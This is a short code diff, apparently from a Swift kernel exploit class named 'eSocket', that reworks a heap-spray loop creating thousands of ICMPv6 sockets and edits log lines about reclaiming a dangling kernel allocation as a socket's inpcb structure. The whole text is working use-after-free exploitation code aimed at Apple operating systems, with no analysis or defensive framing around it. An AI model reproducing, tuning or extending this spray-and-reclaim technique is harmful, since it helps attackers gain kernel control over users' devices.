@@ -97,22 +97,8 @@ class eSocket {
             for fd in socketFDs { close(fd) }
         }
         
-        for _ in 0..<3000 {
-            let fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6)
-            if fd < 0 {
-                print("[eSocket] socket() failed.")
-                return false
-            }
-            let kr = setsockopt(fd, IPPROTO_IPV6, IPV6_UNICAST_HOPS, &ttl, socklen_t(MemoryLayout<Int32>.size))
-            if kr != 0 {
-                print("[eSocket] setsockopt() failed.")
-                close(fd)
-                return false
-            }
-            socketFDs.append(fd)
-        }
-        print("[eSocket] Sprayed 3000 sockets.")
-        for _ in 0..<5 {
+        print("[eSocket] Spraying sockets.")
+        for _ in 0..<10 {
             for _ in 0..<500 {
                 let fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6)
                 if fd < 0 {
@@ -135,7 +121,7 @@ class eSocket {
             if let (fd, inpcb) = matchSocket(sockets: &socketFDs, candidates: inpcb) {
                 socketFD = fd
                 inpcbAddr = inpcb
-                print("[eSocket] Dangling allocation 0x\(String(inpcb, radix: 16)) reallocated as the inpcb for socket \(fd).")
+                print("[eSocket] Address 0x\(String(inpcb, radix: 16)) used as inpcb for socket \(fd.formatted(.number.grouping(.automatic))).")
                 if(!fp.markUsed(page: inpcb)) {
                     print("[eSocket] Fail to mark reclaimed page as used.")
                     return false
